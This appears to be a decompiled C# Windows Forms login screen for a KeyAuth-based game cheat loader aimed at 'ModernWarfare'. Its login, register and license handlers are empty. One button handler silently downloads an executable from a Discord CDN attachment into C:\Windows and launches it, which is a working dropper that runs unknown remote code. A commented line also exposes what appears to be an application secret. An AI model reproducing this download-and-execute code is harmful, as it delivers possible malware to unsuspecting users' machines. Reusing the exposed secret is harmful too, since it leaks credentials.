using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using Siticone.UI.AnimatorNS;
using Siticone.UI.WinForms;
using Siticone.UI.WinForms.Enums;

namespace KeyAuth
{
	// Token: 0x02000006 RID: 6
	public partial class Login : Form
	{
		// Token: 0x06000033 RID: 51 RVA: 0x000051BA File Offset: 0x000033BA
		public Login()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000034 RID: 52 RVA: 0x000051C8 File Offset: 0x000033C8
		private void siticoneControlBox1_Click(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x06000035 RID: 53 RVA: 0x000051D0 File Offset: 0x000033D0
		private void Login_Load(object sender, EventArgs e)
		{

		}

		// Token: 0x06000036 RID: 54 RVA: 0x00005358 File Offset: 0x00003558
		private static string random_string()
		{
			string text = null;
			Random random = new Random();
			for (int i = 0; i < 5; i++)
			{
				text += Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0))).ToString();
			}
			return text;
		}

		// Token: 0x06000037 RID: 55 RVA: 0x000053B4 File Offset: 0x000035B4
		private void UpgradeBtn_Click(object sender, EventArgs e)
		{

		}

		// Token: 0x06000038 RID: 56 RVA: 0x00005408 File Offset: 0x00003608
		private void LoginBtn_Click(object sender, EventArgs e)
		{

		}

		// Token: 0x06000039 RID: 57 RVA: 0x0000547C File Offset: 0x0000367C
		private void RgstrBtn_Click(object sender, EventArgs e)
		{

		}

		// Token: 0x0600003A RID: 58 RVA: 0x000054FC File Offset: 0x000036FC
		private void LicBtn_Click(object sender, EventArgs e)
		{

		}

		// Token: 0x0600003B RID: 59 RVA: 0x00005564 File Offset: 0x00003764
		private void panel5_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0400002A RID: 42
		//public static api KeyAuthApp = new api("VulcanShop", "AUKCrAYTwL", "1521035a0b3e4be322ddbf287f00badf576b355833aa9be73ad9188efa27c1b8", "20.0");

        private void siticoneRoundedButton1_Click(object sender, EventArgs e)
        {
			new Main().Show();
			base.Hide();
			return;
		}

        private void siticoneRoundedButton2_Click(object sender, EventArgs e)
        {
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\random.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/927564154569642024/939211631462866954/LKFSKLDJCS0.exe", text);
			Process.GetProcessesByName("ModernWarfare").FirstOrDefault<Process>();
			File.ReadAllBytes(text);
			if (File.Exists(text))
			{
				Process.Start(text);
			}
		}
    }
}
